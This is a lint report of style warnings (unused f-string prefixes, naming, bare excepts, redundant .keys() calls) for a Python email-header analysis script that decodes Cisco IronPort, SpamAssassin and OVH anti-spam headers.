F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6305:22
     |
6303 |             )
6304 |
6305 |             result = f"- Cisco IronPort Data encrypted blob:\n\n"
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6306 |             result += dumped + "\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6309:22
     |
6308 |         else:
6309 |             result = f"- Cisco IronPort Data encrypted blob. Use --decode-all to print its hexdump."
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6310 |
6311 |         return {
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6330:22
     |
6328 |             )
6329 |
6330 |             result = f"- Cisco IronPort Data encrypted blob:\n\n"
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6331 |             result += dumped + "\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6334:22
     |
6333 |         else:
6334 |             result = f"- Cisco IronPort Data encrypted blob. Use --decode-all to print its hexdump."
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6335 |
6336 |         return {
     |
help: Remove extraneous `f` prefix

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6366:137
     |
6364 | ΓÇªng Mail Flow policy to this e-mail:\n",
6365 | ΓÇª
6366 | ΓÇªsages from a sender to the listener during the SMTP conversation. 
     |                                                                   ^
6367 | ΓÇªeters in the mail flow policy.
     |
help: Remove trailing whitespace

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6382:13
     |
6381 |           if (
6382 | /             value.strip().upper()
6383 | |             in SMTPHeadersAnalysis.Cisco_Predefined_MailFlow_Policies.keys()
     | |____________________________________________________________________________^
6384 |           ):
6385 |               self.addSecurityAppliance("Cisco IronPort / Email Security Appliance (ESA)")
     |
help: Remove `.keys()`

N803 Argument name `topicLine` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6405:33
     |
6403 |             }
6404 |
6405 |     def _parseCiscoPolicy(self, topicLine, description, num, header, value):
     |                                 ^^^^^^^^^
6406 |         result = ""
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6413:12
     |
6411 |         k2 = self.logger.colored(k, "yellow")
6412 |
6413 |         if k in SMTPHeadersAnalysis.Cisco_Predefined_MailFlow_Policies.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6414 |             result += (
6415 |                 f"\t     {k2}: "
     |
help: Remove `.keys()`

N806 Variable `topicLine` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6435:9
     |
6434 |         self.addSecurityAppliance("Cisco IronPort / Email Security Appliance (ESA)")
6435 |         topicLine = f"\n\n- Cisco SenderBase Reputation Service result:\n"
     |         ^^^^^^^^^
6436 |         return self._parseCiscoSBRS(topicLine, "", num, header, value)
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6435:21
     |
6434 |         self.addSecurityAppliance("Cisco IronPort / Email Security Appliance (ESA)")
6435 |         topicLine = f"\n\n- Cisco SenderBase Reputation Service result:\n"
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6436 |         return self._parseCiscoSBRS(topicLine, "", num, header, value)
     |
help: Remove extraneous `f` prefix

N806 Variable `topicLine` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6443:9
     |
6441 |             return []
6442 |
6443 |         topicLine = (
     |         ^^^^^^^^^
6444 |             f"\n\n- Cisco SenderBase Reputation Service result (custom header set):\n"
6445 |         )
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6444:13
     |
6443 |         topicLine = (
6444 |             f"\n\n- Cisco SenderBase Reputation Service result (custom header set):\n"
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6445 |         )
6446 |         self.addSecurityAppliance("Cisco IronPort / Email Security Appliance (ESA)")
     |
help: Remove extraneous `f` prefix

N803 Argument name `topicLine` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6449:31
     |
6447 |         return self._parseCiscoSBRS(topicLine, "", num, header, value)
6448 |
6449 |     def _parseCiscoSBRS(self, topicLine, description, num, header, value):
     |                               ^^^^^^^^^
6450 |         result = ""
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6479:9
     |
6477 |                 result += f'\t- Likely {self.logger.colored(f"trustworthy sender ({num})", "green")}\n'
6478 |
6479 |         except:
     |         ^^^^^^
6480 |             result = f"\t- {value} (could not rate that score!)\n"
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6495:18
     |
6494 |         self.addSecurityAppliance("Cisco IronPort / Email Security Appliance (ESA)")
6495 |         result = f"- Cisco IronPort Anti-Virus interface.\n"
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6496 |         value = SMTPHeadersAnalysis.flattenLine(value)
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6510:23
     |
6509 |         for k, v in parsed.items():
6510 |             result += f"\n\t- " + SMTPHeadersAnalysis.IronPort_AV[k][0] + ":\n"
     |                       ^^^^^^^^^
6511 |             elem = SMTPHeadersAnalysis.IronPort_AV[k][1]
     |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6526:20
     |
6524 |                 vs = v.split("'")
6525 |                 err = "error"
6526 |                 if vs[1] in elem.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^
6527 |                     err = elem[vs[1]]
     |
help: Remove `.keys()`

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6531:13
     |
6529 |                   result += f"\t\t- {err}: {vs[0]}\n"
6530 |
6531 | /             elif k == "v":
6532 | |                 result += f"\t\t- {v}\n"
6533 | |
6534 | |             elif k == "d":
6535 | |                 result += f"\t\t- {v}\n"
     | |________________________________________^
6536 |
6537 |               elif k == "a":
     |
help: Combine `if` branches

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6555:24
     |
6553 |                     c = vs[1][pos]
6554 |
6555 |                     if c in _map.keys():
     |                        ^^^^^^^^^^^^^^^^
6556 |                         action = _map[c]
6557 |                         result += f"\n\t\t- {action} section:\n"
     |
help: Remove `.keys()`

F405 `datetime` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6565:39
     |
6563 | ΓÇª                     ts2 = ""
6564 | ΓÇª                     try:
6565 | ΓÇª                         ts2 = datetime.utcfromtimestamp(int(ts)).strftime(
     |                                 ^^^^^^^^
6566 | ΓÇª                             "%Y-%m-%d %H:%M:%S"
6567 | ΓÇª                         )
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6568:29
     |
6566 | ΓÇª                             "%Y-%m-%d %H:%M:%S"
6567 | ΓÇª                         )
6568 | ΓÇª                     except:
     |                       ^^^^^^
6569 | ΓÇª                         pass
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6576:24
     |
6574 |                         continue
6575 |
6576 |                     if c in SMTPHeadersAnalysis.IronPort_AV[k][1][action].keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6577 |                         h = SMTPHeadersAnalysis.IronPort_AV[k][1][action][c]
6578 |                         result += f"\t\t\t- {c}: {h}\n"
     |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6600:22
     |
6598 |             result = f'- Cisco IronPort Anti-Spam rules {self.logger.colored("marked this message SPAM", "red")}.'
6599 |         else:
6600 |             result = f"- Cisco IronPort Anti-Spam rules considered this message CLEAN."
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6601 |
6602 |         result += f" Value: {value}"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6622:22
     |
6620 |             )
6621 |
6622 |             result = f"- Cisco IronPort Anti-Spam result encrypted blob:\n\n"
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6623 |             result += dumped + "\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6626:22
     |
6625 |         else:
6626 |             result = f"- Cisco IronPort Anti-Spam result encrypted blob. Use --decode-all to print its hexdump."
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6627 |
6628 |         return {
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6641:18
     |
6640 |         self.addSecurityAppliance("SpamAssassin")
6641 |         result = f"- SpamAssassin version."
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^
6642 |
6643 |         return {
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6655:18
     |
6653 |             return []
6654 |
6655 |         result = f"- OVH considered this message as SPAM and attached following Spam "
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6656 |         self.addSecurityAppliance("OVH Anti-Spam")
6657 |         value = (
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6676:33
     |
6674 |         self.addSecurityAppliance("OVH Anti-Spam")
6675 |         result = (
6676 |             self.logger.colored(f"- OVH considered this message as SPAM", "red")
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6677 |             + " and attached following information:\n"
6678 |         )
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6711:23
     |
6710 |         if SMTPHeadersAnalysis.printable(decoded):
6711 |             result += f"- SPAMCAUSE contains encoded information about spam reasons:\n"
     |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6712 |             tmp = ""
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6742:31
     |
6740 | ΓÇª base64.b64decode(p)
6741 | ΓÇªadersAnalysis.printable(decoded):
6742 | ΓÇªt += f"\t- Headers contained Feedback Loop object used by marketing systems to offer ISPs way to notify the sender that recipient marked that e-mail as Junk/Spam.\n"
     |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6743 | ΓÇªt += "\n" + json.dumps(json.loads(decoded), indent=4) + "\n"
     |
help: Remove extraneous `f` prefix

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6778:13
     |
6776 |         handled = [x.lower() for x in SMTPHeadersAnalysis.Handled_Spam_Headers]
6777 |
6778 |         for num, header, value in self.headers:
     |             ^^^
6779 |             value = SMTPHeadersAnalysis.flattenLine(value)
     |
help: Rename unused `num` to `_num`

N803 Argument name `listOfValues` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6872:44
     |
6870 |         }
6871 |
6872 |     def _testListRelatedHeaders(self, msg, listOfValues):
     |                                            ^^^^^^^^^^^^
6873 |         result = ""
6874 |         tmp = ""
     |

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:6880:13
     |
6878 |         handled = [x.lower() for x in SMTPHeadersAnalysis.Handled_Spam_Headers]
6879 |
6880 |         for num, header, value in self.headers:
     |             ^^^
6881 |             value = SMTPHeadersAnalysis.flattenLine(value)
     |
help: Rename unused `num` to `_num`

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7004:13
     |
7002 |                 pos2 -= 1
7003 |
7004 |             l = len(k) - len(k.lstrip())
     |             ^
7005 |             if l > 0:
7006 |                 k = k.strip()
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7037:31
     |
7035 |                 break
7036 |
7037 |         keys = [x.lower() for x in parsed.keys()]
     |                               ^^^^^^^^^^^^^^^^^^
7038 |
7039 |         if "tag_level" in keys:
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7055:16
     |
7054 |         for k, v in parsed.items():
7055 |             if k in SMTPHeadersAnalysis.SpamAssassin_Spam_Status[1].keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7056 |                 k0 = self.logger.colored(k, "magenta")
7057 |                 result += (
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7072:16
     |
7070 |                     v += f" - {score}"
7071 |
7072 |             if type(v) == str:
     |                ^^^^^^^^^^^^^^
7073 |                 result += f"\t\t- {v}\n"
7074 |             else:
     |

N806 Variable `firstHop` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7111:9
     |
7109 |         email = f"{username}@{domain}"
7110 |
7111 |         firstHop = self.received_path[1]
     |         ^^^^^^^^
7112 |
7113 |         mailDomainAddr = ""
     |

N806 Variable `mailDomainAddr` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7113:9
     |
7111 |         firstHop = self.received_path[1]
7112 |
7113 |         mailDomainAddr = ""
     |         ^^^^^^^^^^^^^^
7114 |         revMailDomain = ""
7115 |         revFirstSenderDomain = firstHop["host2"]
     |

N806 Variable `revMailDomain` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7114:9
     |
7113 |         mailDomainAddr = ""
7114 |         revMailDomain = ""
     |         ^^^^^^^^^^^^^
7115 |         revFirstSenderDomain = firstHop["host2"]
7116 |         firstSenderAddr = ""
     |

N806 Variable `revFirstSenderDomain` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7115:9
     |
7113 |         mailDomainAddr = ""
7114 |         revMailDomain = ""
7115 |         revFirstSenderDomain = firstHop["host2"]
     |         ^^^^^^^^^^^^^^^^^^^^
7116 |         firstSenderAddr = ""
     |

N806 Variable `firstSenderAddr` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7116:9
     |
7114 |         revMailDomain = ""
7115 |         revFirstSenderDomain = firstHop["host2"]
7116 |         firstSenderAddr = ""
     |         ^^^^^^^^^^^^^^^
7117 |
7118 |         try:
     |

N806 Variable `mailDomainAddr` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7119:13
     |
7118 |         try:
7119 |             mailDomainAddr = SMTPHeadersAnalysis.gethostbyname(domain)
     |             ^^^^^^^^^^^^^^
7120 |             revMailDomain = SMTPHeadersAnalysis.gethostbyaddr(mailDomainAddr)
     |

N806 Variable `revMailDomain` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7120:13
     |
7118 |         try:
7119 |             mailDomainAddr = SMTPHeadersAnalysis.gethostbyname(domain)
7120 |             revMailDomain = SMTPHeadersAnalysis.gethostbyaddr(mailDomainAddr)
     |             ^^^^^^^^^^^^^
7121 |
7122 |             if (len(firstHop["ip"])) > 0 and len(revFirstSenderDomain) == 0:
     |

N806 Variable `revFirstSenderDomain` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7123:17
     |
7122 |             if (len(firstHop["ip"])) > 0 and len(revFirstSenderDomain) == 0:
7123 |                 revFirstSenderDomain = SMTPHeadersAnalysis.gethostbyaddr(firstHop["ip"])
     |                 ^^^^^^^^^^^^^^^^^^^^
7124 |
7125 |             if (len(firstHop["host"])) > 0:
     |

N806 Variable `firstSenderAddr` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7126:17
     |
7125 |             if (len(firstHop["host"])) > 0:
7126 |                 firstSenderAddr = SMTPHeadersAnalysis.gethostbyname(firstHop["host"])
     |                 ^^^^^^^^^^^^^^^
7127 |                 if len(revFirstSenderDomain) == 0:
7128 |                     revFirstSenderDomain = SMTPHeadersAnalysis.gethostbyaddr(
     |

N806 Variable `revFirstSenderDomain` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7128:21
     |
7126 |                 firstSenderAddr = SMTPHeadersAnalysis.gethostbyname(firstHop["host"])
7127 |                 if len(revFirstSenderDomain) == 0:
7128 |                     revFirstSenderDomain = SMTPHeadersAnalysis.gethostbyaddr(
     |                     ^^^^^^^^^^^^^^^^^^^^
7129 |                         firstSenderAddr
7130 |                     )
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7131:9
     |
7129 |                         firstSenderAddr
7130 |                     )
7131 |         except:
     |         ^^^^^^
7132 |             pass
     |

N806 Variable `senderDomain` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7134:9
     |
7132 |             pass
7133 |
7134 |         senderDomain = SMTPHeadersAnalysis.extractDomain(revMailDomain)
     |         ^^^^^^^^^^^^
7135 |         firstHopDomain1 = SMTPHeadersAnalysis.extractDomain(revFirstSenderDomain)
     |

N806 Variable `firstHopDomain1` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7135:9
     |
7134 |         senderDomain = SMTPHeadersAnalysis.extractDomain(revMailDomain)
7135 |         firstHopDomain1 = SMTPHeadersAnalysis.extractDomain(revFirstSenderDomain)
     |         ^^^^^^^^^^^^^^^
7136 |
7137 |         if len(senderDomain) == 0:
     |

N806 Variable `senderDomain` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7138:13
     |
7137 |         if len(senderDomain) == 0:
7138 |             senderDomain = domain
     |             ^^^^^^^^^^^^
7139 |         if len(firstHopDomain1) == 0:
7140 |             firstHopDomain1 = firstHop["host"]
     |

N806 Variable `firstHopDomain1` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7140:13
     |
7138 |             senderDomain = domain
7139 |         if len(firstHopDomain1) == 0:
7140 |             firstHopDomain1 = firstHop["host"]
     |             ^^^^^^^^^^^^^^^
7141 |
7142 |         senderDomain = senderDomain.replace("<", "").replace(">", "").strip()
     |

N806 Variable `senderDomain` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7142:9
     |
7140 |             firstHopDomain1 = firstHop["host"]
7141 |
7142 |         senderDomain = senderDomain.replace("<", "").replace(">", "").strip()
     |         ^^^^^^^^^^^^
7143 |         firstHopDomain1 = firstHopDomain1.replace("<", "").replace(">", "").strip()
     |

N806 Variable `firstHopDomain1` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7143:9
     |
7142 |         senderDomain = senderDomain.replace("<", "").replace(">", "").strip()
7143 |         firstHopDomain1 = firstHopDomain1.replace("<", "").replace(">", "").strip()
     |         ^^^^^^^^^^^^^^^
7144 |
7145 |         result += f"\t- Mail From: <{email}>\n\n"
     |

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7163:45
     |
7161 |                 response = dns.resolver.resolve(domain, "TXT")
7162 |
7163 |             except dns.resolver.NoAnswer as e:
     |                                             ^
7164 |                 response = []
     |
help: Remove assignment to unused variable `e`

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7166:50
     |
7164 |                 response = []
7165 |
7166 |             except dns.resolver.NoNameservers as e:
     |                                                  ^
7167 |                 response = []
     |
help: Remove assignment to unused variable `e`

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7169:38
     |
7167 |                 response = []
7168 |
7169 |             except AttributeError as e:
     |                                      ^
7170 |                 response = []
     |
help: Remove assignment to unused variable `e`

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7172:33
     |
7170 |                 response = []
7171 |
7172 |             except Exception as e:
     |                                 ^
7173 |                 response = []
     |
help: Remove assignment to unused variable `e`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7221:17
     |
7219 |         if value.strip().lower() == "yes":
7220 |             result = self.logger.colored(
7221 |                 f"- SpamAssassin marked this message as SPAM:\n", "red"
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7222 |             )
7223 |             result += f"\t- " + self.logger.colored(value, "red") + "\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7223:23
     |
7221 |                 f"- SpamAssassin marked this message as SPAM:\n", "red"
7222 |             )
7223 |             result += f"\t- " + self.logger.colored(value, "red") + "\n"
     |                       ^^^^^^^
7224 |         else:
7225 |             result = self.logger.colored(
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7226:17
     |
7224 |         else:
7225 |             result = self.logger.colored(
7226 |                 f"- SpamAssassin did not mark this message as spam:\n", "green"
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7227 |             )
7228 |             result += f"\t- " + self.logger.colored(value, "green") + "\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7228:23
     |
7226 |                 f"- SpamAssassin did not mark this message as spam:\n", "green"
7227 |             )
7228 |             result += f"\t- " + self.logger.colored(value, "green") + "\n"
     |                       ^^^^^^^
7229 |
7230 |         return {
     |
help: Remove extraneous `f` prefix

N803 Argument name `topicLine` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7237:39
     |
7235 |         }
7236 |
7237 |     def _parseAsteriskRiskScore(self, topicLine, description, num, header, value):
     |                                       ^^^^^^^^^
7238 |         desc = ""
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7245:16
     |
7244 |         if len(value) <= 6:
7245 |             if value in SMTPHeadersAnalysis.Aterisk_Risk_Score.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7246 |                 desc = f" ({SMTPHeadersAnalysis.Aterisk_Risk_Score[value]})"
     |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7282:22
     |
7280 |         self.addSecurityAppliance("SpamAssassin")
7281 |         if len(value.strip()) > 0:
7282 |             result = f"- SpamAssassin assigned following spam report to this message:\n"
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7283 |             tmp = ""
     |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7311:16
     |
7310 |         for prop in props:
7311 |             if prop in SMTPHeadersAnalysis.ATP_Message_Properties.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7312 |                 result += (
7313 |                     f"\t- "
     |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7313:21
     |
7311 |             if prop in SMTPHeadersAnalysis.ATP_Message_Properties.keys():
7312 |                 result += (
7313 |                     f"\t- "
     |                     ^^^^^^^
7314 |                     + self.logger.colored(
7315 |                         SMTPHeadersAnalysis.ATP_Message_Properties[prop], "magenta"
     |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7341:12
     |
7339 |         k = value.strip().upper()
7340 |
7341 |         if k in SMTPHeadersAnalysis.AMP_Results.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7342 |             val = f"\t- {k}: {SMTPHeadersAnalysis.AMP_Results[k]}\n"
7343 |         else:
     |
help: Remove `.keys()`

N803 Argument name `numReceived` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7374:39
     |
7372 |         }
7373 |
7374 |     def parseReceived(self, received, numReceived):
     |                                       ^^^^^^^^^^^
7375 |         obj = {
7376 |             "host": "",
     |

N806 Variable `posOfKey` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7401:9
     |
7399 |         pos = 0
7400 |         lastkey = ""
7401 |         posOfKey = 0
     |         ^^^^^^^^
7402 |         extrapos = 0
     |

SIM108 Use ternary operator `tmp = True if pos == 0 else received[pos - 1] in string.whitespace` instead of `if`-`else`-block
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7429:17
     |
7427 |                       continue
7428 |                   tmp = False
7429 | /                 if pos == 0:
7430 | |                     tmp = True
7431 | |                 else:
7432 | |                     tmp = received[pos - 1] in string.whitespace
     | |________________________________________________________________^
7433 |
7434 |                   if received[pos:].lower().startswith(key + " ") and tmp:
     |
help: Replace `if`-`else`-block with `tmp = True if pos == 0 else received[pos - 1] in string.whitespace`

F841 Local variable `keynow` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7440:31
     |
7438 |                         ].strip()
7439 |
7440 |                     lastkey = keynow = key
     |                               ^^^^^^
7441 |                     posOfKey = pos
7442 |                     found.add(key)
     |
help: Remove assignment to unused variable `keynow`

N806 Variable `posOfKey` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7441:21
     |
7440 |                     lastkey = keynow = key
7441 |                     posOfKey = pos
     |                     ^^^^^^^^
7442 |                     found.add(key)
7443 |                     pos += len(key)
     |

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7448:12
     |
7446 |             pos += 1
7447 |
7448 |         if lastkey not in parsed.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7449 |             parsed[lastkey] = received[posOfKey + len(lastkey) + 1 :].strip()
     |
help: Remove `.keys()`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:7457:12
     |
7455 |         obj["parsed"] = parsed
7456 |
7457 |         if "from" not in parsed.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^
7458 |             return {}
